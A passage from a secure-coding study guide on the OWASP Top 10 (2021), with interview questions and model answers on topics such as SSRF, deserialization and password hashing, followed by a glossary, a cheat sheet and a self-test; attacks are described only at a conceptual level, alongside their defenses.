Model: Use a memory-hard KDF — **Argon2id** (or bcrypt/scrypt) with per-user salt and tuned cost. Fast general hashes (MD5/SHA-256) allow billions of GPU guesses/sec → a dump is cracked quickly. KDFs are deliberately slow + salted to defeat brute force and rainbow tables.
- *Follow-up: salt vs pepper?* Salt = per-record, stored with hash (defeats rainbow tables); pepper = secret added to all, stored separately (defeats DB-only dumps).
- *Follow-up: how to pick cost?* Benchmark to ~50–250 ms/hash on prod hardware; balance against login-throughput DoS.

**Q6. Walk me through an SSRF attack in the cloud and the defenses. (senior-signal)**
Model: A server feature fetches a user-supplied URL; attacker points it at `169.254.169.254` metadata service to steal IAM creds (the Capital One pattern). Defenses (defense-in-depth): allowlist scheme/host/port; resolve and validate the IP is public; pin the resolved IP / re-validate at connect to beat DNS rebinding; disable redirects; egress firewall blocking link-local/private; enforce **IMDSv2**; run fetchers with no credentials in an isolated segment.
- *Follow-up: why is a blocklist insufficient?* Alternate IP encodings, IPv6, DNS rebinding (TOCTOU), open redirects.
- *Follow-up: how does IMDSv2 help structurally?* Requires a session-token PUT then GET with a hop limit, which a simple SSRF can't perform.

**Q7. Insecure deserialization — how does it become RCE, and how do you defend? (senior-signal)**
Model: Native deserialization reconstructs arbitrary types and runs their callbacks; a **gadget chain** of classpath classes (ysoserial) ends at a code-exec sink. Defense: don't native-deserialize untrusted bytes — use JSON to concrete types; if forced, `ObjectInputFilter` allowlist; never enable Jackson default typing on untrusted input.
- *Follow-up: where do untrusted bytes sneak in?* Cookies, message queues, caches, API bodies, RMI.
- *Follow-up: why isn't a blocklist of bad classes enough?* New gadget chains emerge in many libs; allowlist what you expect instead.

**Q8. What is Insecure Design and how does it differ from Insecure Implementation? (senior-signal)**
Model: Insecure design = a missing/ineffective control *by design* (e.g., no rate limit on OTP, KBA password recovery) — unfixable by code patching because the idea is flawed. Insecure implementation = a sound design with a coding bug. Address design flaws with **threat modeling, abuse cases, security requirements, secure patterns** during the SDLC. SAST/DAST often miss them because nothing is malformed — it's business-logic abuse.
- *Follow-up: example tooling/process?* STRIDE threat modeling, attack trees, design review gates.
- *Follow-up: how does it relate to API4/API6?* Unrestricted resource consumption / business-flow abuse are design-level limits.

**Q9. Your team must add a "fetch image from URL" feature on AWS. Walk the design securely. (senior-signal)**
Model: Treat the URL as hostile (A10). Allowlist schemes (http/https) and ideally destination domains; resolve + validate public IP, pin it, disable redirects, set timeouts and response-size limits (A04 resource consumption); run the fetcher in a subnet with an egress proxy enforcing the allowlist and no IAM creds; enforce IMDSv2; log destinations and alert on internal targets (A09). Also size-limit and content-type-validate the downloaded image.
- *Follow-up: DNS rebinding?* Pin resolved IP / enforce at proxy.
- *Follow-up: cost/DoS angle?* Timeouts, max size, rate limit, concurrency cap.

**Q10. Compare SAST, DAST, and SCA — which catches what, and what catches A01?**
Model: SAST = source/bytecode patterns (injection, crypto) early but weak on runtime/config and authZ logic; DAST = black-box runtime exploitability incl. config; SCA = known-CVE dependencies. **A01 (authorization) is largely missed by all three** — it needs human review + targeted multi-user tests. Combine all, shift left, and add authZ regression tests.
- *Follow-up: where does WAF fit?* Edge defense-in-depth / virtual patching, not a fix.

**Q11. What changed structurally from the 2017 to 2021 list, and why does that matter?**
Model: Categories were reorganized around *root causes* (Cryptographic Failures vs "Sensitive Data Exposure"), XSS folded into Injection, XXE into Misconfiguration, and three more cause-oriented categories appeared (Insecure Design, Software & Data Integrity Failures, SSRF). It matters because it pushes teams from symptom-chasing to fixing root causes and design-level/supply-chain risks.

**Q12. How do you operationalize the Top 10 in a CI/CD pipeline? (senior-signal)**
Model: SAST (Find-Sec-Bugs/Semgrep/CodeQL) + SCA (Dependency-Check/Snyk) gating on High/Critical, SBOM generation (CycloneDX), secret scanning, container scanning (Trivy), DAST (ZAP baseline) against staging, signed artifacts (cosign/SLSA provenance), and authZ regression tests. Define patch SLAs and break the build on policy violations; feed findings to a tracker.

---

## 11. Glossary

- **AEAD** — Authenticated Encryption with Associated Data; provides confidentiality *and* integrity (AES-GCM, ChaCha20-Poly1305).
- **Argon2id** — memory-hard password-hashing KDF; OWASP's first choice.
- **ASVS** — Application Security Verification Standard; OWASP's testable requirements (L1–L3).
- **AuthN / AuthZ** — Authentication (who you are) / Authorization (what you may do).
- **bcrypt / scrypt / PBKDF2** — password KDFs (deliberately slow hashes).
- **BFLA** — Broken Function Level Authorization; calling functions you shouldn't.
- **BOLA** — Broken Object Level Authorization; accessing objects you shouldn't (API term for IDOR).
- **CIA triad** — Confidentiality, Integrity, Availability.
- **CORS** — Cross-Origin Resource Sharing; browser policy for cross-site requests.
- **CRS** — OWASP Core Rule Set for ModSecurity WAFs.
- **CSP** — Content Security Policy; HTTP header limiting what a page may load/execute (XSS defense).
- **CSPRNG** — Cryptographically Secure Pseudo-Random Number Generator (`SecureRandom`).
- **CVE** — Common Vulnerabilities and Exposures; a specific identified vulnerability.
- **CVSS** — Common Vulnerability Scoring System; 0–10 severity score.
- **CWE** — Common Weakness Enumeration; a *type* of weakness.
- **DAST** — Dynamic Application Security Testing; black-box scanning of a running app.
- **Defense in depth** — overlapping independent controls so one failure isn't a breach.
- **Deserialization** — reconstructing an object from bytes; dangerous when bytes are untrusted.
- **DTD** — Document Type Definition; XML feature exploited in XXE.
- **Envelope encryption** — encrypt data with a data key, encrypt the data key with a KMS master key.
- **Gadget chain** — sequence of classpath classes whose deserialization side-effects yield code execution.
- **HSM** — Hardware Security Module; tamper-resistant key storage.
- **HSTS** — HTTP Strict Transport Security; forces HTTPS.
- **IDOR** — Insecure Direct Object Reference (web term for BOLA).
- **IMDSv2** — AWS Instance Metadata Service v2; token-protected metadata that mitigates SSRF.
- **IAST** — Interactive Application Security Testing; runtime-instrumented analysis.
- **IV / nonce** — unique per-encryption value; never reuse with the same key.
- **JCA** — Java Cryptography Architecture (the JDK crypto APIs).
- **JNDI** — Java Naming and Directory Interface; the lookup API abused by Log4Shell.
- **JWT** — JSON Web Token; signed, self-contained token (signed, *not* encrypted).
- **JWKS** — JSON Web Key Set; the public keys an IdP publishes for JWT verification.
- **KDF** — Key Derivation Function; deliberately slow hash for passwords/keys.
- **KMS** — Key Management Service; managed key storage/operations.
- **Least privilege** — grant only the permissions needed.
- **Mass assignment / over-posting** — binding a request to fields the user shouldn't control.
- **MFA** — Multi-Factor Authentication.
- **NVD** — National Vulnerability Database; feeds CVE/CVSS data (used by SCA).
- **OGNL / SpEL** — expression languages; injection into them caused Struts/Spring RCEs.
- **OWASP** — Open Worldwide Application Security Project.
- **Padding oracle** — attack decrypting CBC ciphertext via error differences.
- **Parameterized query / prepared statement** — query template + data on separate channels (SQLi defense).
- **Pepper** — secret added to all password hashes, stored separately from the DB.
- **RASP** — Runtime Application Self-Protection.
- **Rainbow table** — precomputed hash→password lookup; defeated by salting.
- **Salt** — per-record random value mixed into a hash.
- **SAST** — Static Application Security Testing.
- **SBOM** — Software Bill of Materials (CycloneDX/SPDX).
- **SCA** — Software Composition Analysis; scans dependencies for known CVEs.
- **SDLC** — Software Development Life Cycle (secure variant adds security gates).
- **Serialization** — converting an object to bytes.
- **Session fixation** — forcing a victim to use an attacker-known session id.
- **SIEM** — Security Information and Event Management; log aggregation/alerting.
- **SLSA** — Supply-chain Levels for Software Artifacts; build-integrity framework.
- **SSRF** — Server-Side Request Forgery.
- **SSTI** — Server-Side Template Injection.
- **STRIDE** — threat-modeling taxonomy (Spoofing, Tampering, Repudiation, Info disclosure, DoS, Elevation).
- **TLS / SSL** — Transport Layer Security (SSL is its deprecated predecessor).
- **TOCTOU** — Time-Of-Check-To-Time-Of-Use race (e.g., DNS rebinding).
- **Trust boundary** — line across which trust level changes; validate input crossing it inward.
- **WAF** — Web Application Firewall; edge filter for attack patterns.
- **XSS** — Cross-Site Scripting (folded into Injection in 2021).
- **XXE** — XML External Entity injection (folded into Misconfiguration in 2021).
- **ysoserial** — tool generating Java deserialization gadget payloads.

---

## 12. Cheat-sheet & self-test

### 12.1 One-screen recap

**The 2021 list (rank order):** A01 Broken Access Control · A02 Cryptographic Failures · A03 Injection · A04 Insecure Design · A05 Security Misconfiguration · A06 Vulnerable & Outdated Components · A07 Identification & Authentication Failures · A08 Software & Data Integrity Failures · A09 Security Logging & Monitoring Failures · A10 SSRF.

**The four seams (mental model):** untrusted input (A03, A08, A10) · authorization (A01) · secrets (A02, A07) · visibility (A09). Plus design (A04), config (A05), dependencies (A06).

**The reflexes:**
- Injection → **parameterize/encode at the sink**, allowlist identifiers.
- Access control → **server-side object-scoped authZ, deny by default**, identity from the principal.
- Crypto → **Argon2id passwords, AES-GCM data, TLS 1.2/1.3, SecureRandom, KMS keys**.
- AuthN → **MFA, rate limit, breached-password check, hardened sessions/JWT (pin alg, short exp)**.
- Components → **SBOM + SCA gate + fast patch SLA**.
- Integrity → **don't native-deserialize untrusted bytes; sign & verify artifacts (SLSA/cosign)**.
- SSRF → **allowlist destination, validate resolved IP, no redirects, IMDSv2, egress firewall**.
- Config → **no defaults, generic errors, security headers, disable XXE, lock down Actuator**.
- Logging → **log security events with context, centralize, alert, never log secrets**.
- Design → **threat model + abuse cases + rate/limit controls before coding**.

**Key numbers/defaults:** CVSS Critical 9.0–10.0, High 7.0–8.9 · bcrypt default strength 10 · AES-GCM IV 12 bytes / tag 128 bits · target ~50–250 ms per password hash · AWS metadata IP `169.254.169.254` · prefer TLS 1.2/1.3 only.

**Decision rules:** allowlist > blocklist; parameterize > escape; AEAD > CBC/ECB; server authZ > client authZ; deny by default; validate at boundary, encode at sink; never trust client-supplied price/role/owner.

### 12.2 Self-test (no answers — active recall)

1. A teammate "fixes" SQLi by escaping single quotes in a WAF rule. Give three reasons this is insufficient and state the correct fix, including the case of a dynamic ORDER BY column.
2. Design the authorization for `GET /api/v2/orders/{id}` in a multi-tenant system so that IDOR/BOLA is structurally impossible, and explain why returning 404 vs 403 might matter.
3. Walk through, step by step, how an attacker turns a "render PDF from URL" feature into theft of AWS IAM credentials, and list every layer of defense that would have stopped it.
4. Explain why MD5(password) is dangerous even with HTTPS and a firewall, and specify exactly what you'd use instead (algorithm + how you'd choose its cost).
5. You must accept a serialized Java object from a partner over a message queue. Enumerate the risks and describe a defense-in-depth approach (and the better alternative to native serialization).
6. Map each of the API Security Top 10 (2023) entries to its closest Web Top 10 (2021) category, and name the two API entries that have no clean web equivalent and why they exist.
7. Your monitoring never caught a 3-month data exfiltration via IDOR. Which 2021 categories failed, and what specific logging/alerting controls would have detected it within hours?
